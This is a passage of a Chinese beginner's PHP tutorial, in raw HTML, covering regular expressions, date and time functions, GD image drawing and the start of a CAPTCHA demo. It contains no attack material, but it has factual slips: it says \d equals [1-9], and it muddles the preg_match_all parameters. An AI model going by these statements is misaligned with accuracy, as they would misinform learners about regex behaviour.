title="简单介绍"></a>简单介绍</h2><p>正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本。<br>正则表达式是对字符串（包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为“元字符”））操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。正则表达式是一种文本模式，该模式描述在搜索文本时要匹配的一个或多个字符串。</p><h2 id="定界符"><a href="#定界符" class="headerlink" title="定界符"></a>定界符</h2><p>我们一般使用正斜杠‘/’，来作为定界符，当然也可以使用其它的符号比如<code>!!、##、&#123;&#125;、||</code>定界符代表一个正则表达式的开始与结束。（必须是前后一致的）</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/test/'</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'abctestdhdantest'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>preg_match_all()</code>按照指定的正则表达式，在给定的字符串中进行搜索，匹配到符合特征的部分取出来。它有三个参数，第一个是需要搜索的字符串，第二个是给定搜索的字符串范围，第三个参数可填可不填。可以看下面这个示例（删除之后）</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/test/'</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'abctestdhdantest'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>运行结果是<br><img src="https://img-blog.csdnimg.cn/20200407103831839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>通过代码，可以直观的看出来定界符的用法</p><h2 id="普通字符"><a href="#普通字符" class="headerlink" title="普通字符"></a>普通字符</h2><p>正则表达式里的普通字符。如a到z、A到Z、0到9、单引号、双引号。他们是没有特殊含义的。</p><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><p>元字符指的是在正则表达式中含有特殊含义的字符（不用背，用到时去查就OK）</p><h3 id="常见的元字符"><a href="#常见的元字符" class="headerlink" title="常见的元字符"></a>常见的元字符</h3><p><code>\d</code>    匹配任意一个十进制数字，等价于【1-9】<br><code>\D</code>    匹配任意一个除十进制数字以外的字符等价于【^0-9】<br><code>\s</code>    匹配任意一个空白字符，比如换页符、换行符、回车符、制表符、垂直制表符。<br><code>\S</code>    匹配除空白字符以外任意一个字符<br><code>\w</code>    匹配任意一个数字或字母或下划线<br><code>\W</code>    匹配除数字、字母、下划线以外的任意一个字符<br><code>.</code>        匹配除换行符以外的任意一个字符<br><code>*</code>        匹配0次、或1次或多次其前面的字符，放在<code>*</code>前面的那个字符可以出现0次，也可以出现1次，也可以出现多次。<br>等等，<br>看下在代码中的作用，全放在一个代码中了。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/t\dst/'</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span><span class="token single-quoted-string string">'ancasdst3stfdd'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">" &lt;br />"</span><span class="token punctuation">;</span><span class="token variable">$one</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/t\Dst/'</span><span class="token punctuation">;</span><span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'snfjdt@stkkksnc'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$one</span><span class="token punctuation">,</span> <span class="token variable">$str1</span><span class="token punctuation">,</span> <span class="token variable">$arr1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">" &lt;br />"</span><span class="token punctuation">;</span><span class="token variable">$two</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/t\sst/'</span><span class="token punctuation">;</span><span class="token variable">$str2</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'sdst stffd'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$two</span><span class="token punctuation">,</span> <span class="token variable">$str2</span><span class="token punctuation">,</span> <span class="token variable">$arr2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">" &lt;br />"</span><span class="token punctuation">;</span><span class="token variable">$three</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/t\wst/'</span><span class="token punctuation">;</span><span class="token variable">$str3</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'asdat_stgggd'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$three</span><span class="token punctuation">,</span> <span class="token variable">$str3</span><span class="token punctuation">,</span> <span class="token variable">$arr3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">" &lt;br />"</span><span class="token punctuation">;</span><span class="token variable">$four</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/t.st/'</span><span class="token punctuation">;</span><span class="token variable">$str4</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'sgddht@stfgg'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$four</span><span class="token punctuation">,</span> <span class="token variable">$str4</span><span class="token punctuation">,</span> <span class="token variable">$arr4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">" &lt;br />"</span><span class="token punctuation">;</span><span class="token variable">$five</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/te*st/'</span><span class="token punctuation">;</span><span class="token variable">$str5</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'hhdteeeeestfffds'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$five</span><span class="token punctuation">,</span> <span class="token variable">$str5</span><span class="token punctuation">,</span> <span class="token variable">$arr5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">" &lt;br />"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200407114401625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>元字符另外还有好多，<br><code>+</code>匹配一次或者多次前面的字符。<br><code>?</code>匹配一次或者零次前面的字符。<br><code>&#123;n&#125;</code>        前面的字符出现次数等于n次。<br><code>&#123;n,&#125;</code>        前面的字符出现次数不少于n次，也就是要大于等于n次。<br><code>&#123;n,m&#125;</code>        前面的字符出现次数至少出现n次，最多出现m次。<br><code>|</code>匹配两个或多个模式<br><code>[]</code>匹配方括号中的任意一个字符<br><code>^或\A</code>匹配字符串开始的位置<br><code>$或\Z</code>匹配字符串结束的位置<br><code>[^]</code>匹配除方括号中字符以外的任意一个字符。<br><code>()</code>将括号中作为一个整体，以便将其中的内容获取到。<br>等等</p><h3 id="元字符之间可以互相配合。"><a href="#元字符之间可以互相配合。" class="headerlink" title="元字符之间可以互相配合。"></a>元字符之间可以互相配合。</h3><p>比如<br><code>.</code>和<code>&#123;n&#125;</code>配合。匹配n个任意字符。<br><code>.</code>和<code>*</code>配合。匹配任意字符多个。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/t.*t/'</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span><span class="token single-quoted-string string">'ancasdst3fgfgfstfdddfjdkodt'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">" &lt;br />"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>.*</code>配合，默认情况尽可能多的匹配字符。（贪婪匹配）。<br>上面代码运行结果是<br><img src="https://img-blog.csdnimg.cn/20200407131018989.png" alt="Augenstern" loading="lazy"><br><code>.*?</code>配合，解决贪婪问题，</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/t.*?t/'</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span><span class="token single-quoted-string string">'ancasdst3fgfgfstfdddfjdkodt'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">" &lt;br />"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/2020040713104928.png" alt="Augenstern" loading="lazy"><br>之前看过一个python爬虫的代码，就有正则表达式，其中还用到了<code>.*?</code>这个组合的元字符。之前还不懂是什么意思。</p><h2 id="模式修正符"><a href="#模式修正符" class="headerlink" title="模式修正符"></a>模式修正符</h2><p><code>i</code> 在和模式进行匹配时不区分大小写。<br>demo示例：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/test/i'</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span><span class="token single-quoted-string string">'   test  TESt  Test  TeSt  '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">" &lt;br />"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>这个可以匹配到四个。此时大小写不区分。<br><code>m</code>    多行匹配，如果目标字符串中没有‘\n’字符或者模式中没有出现<code>^或$</code>，设置这个修饰符不产生任何影响。<br>使用条件：<br>1.目标字符串中必须包含“\n”；并且，在字符串中，出现了“\n”,那么就表示新的一行的开始。<br>2.正则表达式中必须要出现<code>^或$</code><br>demo示例：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/^test/m'</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span><span class="token double-quoted-string string">"test\ntest\ntest\ntest"</span><span class="token punctuation">;</span><span class="token comment">//注意这里使用双引号</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200407153107247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br><code>s</code>此模式修正符设定后，则<code>.</code>将匹配所有的字符 ，<strong>包括换行符</strong><br><code>U</code>禁止贪婪匹配。<br>模式修正符也可搭配使用。</p><h3 id="与正则表达式配合的函数"><a href="#与正则表达式配合的函数" class="headerlink" title="与正则表达式配合的函数"></a>与正则表达式配合的函数</h3><ul><li><code>preg_match()</code>执行一个正则表达式匹配，匹配0次或1次就停止。<br>参数说明：<br>  第一个参数：正则表达式。<br>  第二个参数：目标字符串。<br>  第三个参数：放一个变量，执行完成之后，里面会有匹配到的部分以及等等一些数据。<br>  第四个参数：可以传PREG_OFFSET_CAPTURE进入（那么第三个参数那个变量里面就会有匹配到的部分的偏移值）默认传的是0<br>  第五个参数：可以传一个值，来表示从目标字符串的哪个位置开始搜索（单位是字节）。<br>  一个demo示例<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/t(.*?)st/'</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'adsashtest  tshahgcst   test   tschcbcgst   '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token constant">PREG_OFFSET_CAPTURE</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"找到了！&lt;br />"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"没找到！"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre>运行结果<br><img src="https://img-blog.csdnimg.cn/20200408090008697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></li><li><code>preg_match_all()</code><br>参数说明：<br>第四个参数：（可选）</li></ul><blockquote><p>PREG_PATTERN_ORDER<br>PREG_SET_ORDER<br>PREG_OFFSET_CAPTURE</p></blockquote><p>偏移值的设定。</p><ul><li><code>preg_replace()</code><br>执行一个正则表达式的搜索和替换。<br>参数说明：<br>第一个参数：正则表达式<br>第二个参数：要替换成的字符串<br>第三个参数：目标字符串<br>第四个参数（可选）：默认是-1，就是替换所有符合特征的部分。<br>第五个参数（可选）：可以放一个变量。<br>preg_replace传数组<br>第一个参数和第二个参数传数组，一一对应的去替换<h1 id="日期与时间"><a href="#日期与时间" class="headerlink" title="日期与时间"></a>日期与时间</h1>一、设置时区：一般设置上海的时区。<br>二、获取当前Unix时间戳<br>关于Unix时间戳：从格林威治时间1970年1月1日00时00分00秒开始到当前的秒数。用函数<code>time()</code>。<br>三、获取指定时间的Unix时间戳<br>函数<code>mktime()</code>参数顺序（时，分，秒，月，日，年）<br>四、从Unix时间戳取得时间日期信息<br>函数：<code>date()</code>格式化一个本地时间。<br>参数，把format字符放在参数里面。<br>五、获取Unix时间戳和微妙数<br>函数<code>microtime()</code> <h2 id="demo示例"><a href="#demo示例" class="headerlink" title="demo示例"></a>demo示例</h2>上海时间：<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">date_default_timezone_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Asia/Shanghai'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置时区</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取当前Unix时间戳</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">mktime</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2020</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//自定义时间与日期</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Y-m-d G:i:s'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//格式化当前时间与日期。</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">microtime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre>运行结果：<br><img src="https://img-blog.csdnimg.cn/20200410181412710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><h1 id="图像处理"><a href="#图像处理" class="headerlink" title="图像处理"></a>图像处理</h1><h2 id="创建一个简单图像"><a href="#创建一个简单图像" class="headerlink" title="创建一个简单图像"></a>创建一个简单图像</h2>创建图像</li></ul><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$img</span><span class="token operator">=</span><span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//新建一个长和高都为200像素的真彩色图像</span></code></pre><p>分配颜色</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$color1</span><span class="token operator">=</span><span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">219</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分配颜色</span></code></pre><p>填充颜色</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">imagefill</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//填充颜色 </span></code></pre><p>保存图像</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">imagejpeg</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//保存图像 </span></code></pre><p>销毁图像</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//销毁图像</span></code></pre><p>想要在浏览器中显示，还要再加上一个header头，用来向浏览器解释这是个图片</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//向浏览器说明这是个图片</span></code></pre><p>这样就能在浏览器中看到效果图了<br><img src="https://img-blog.csdnimg.cn/20200410213126844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><p><code>imagesetpixel()</code>画一个单一像素<br><code>imageline()</code>画一条线段<br><code>imagerectangle()</code>画一个矩形<br><code>imagestring()</code>水平的画一行字符串<br><code>imagettftext()</code>用TrueType字体向图像写入文本<br><code>imagettfbbox()</code>计算TrueType字体所占区域<br><code>imagecopy()</code>拷贝图像的一部分<br><code>imagecopymerge()</code>拷贝并合并图像的一部分<br><code>imagecopyresampled()</code>重采样拷贝部分图像并调整大小<br>自制验证码demo</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$width</span><span class="token operator">=</span><span class="token number">120</span><span class="token punctuation">;</span><span class="token variable">$height</span><span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">;</span><span class="token variable">$string</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token variable">$element</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'d'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'e'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'f'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'g'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'h'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'i'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'j'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'k'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'l'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'m'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'n'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'o'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'p'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'q'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'s'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'t'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'u'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'v'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'w'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'x'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'y'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span><span class="token number">5</span> <span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$string</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$element</span><span class="token punctuation">[</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$element</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$img</span><span class="token operator">=</span><span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token variable">$width</span><span class="token punctuation">,</span> <span class="token variable">$height</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$color_bg</span><span class="token operator">=</span><span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$color_border</span><span class="token operator">=</span><span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$color_string</span><span class="token operator">=</span><span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imagefill</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span 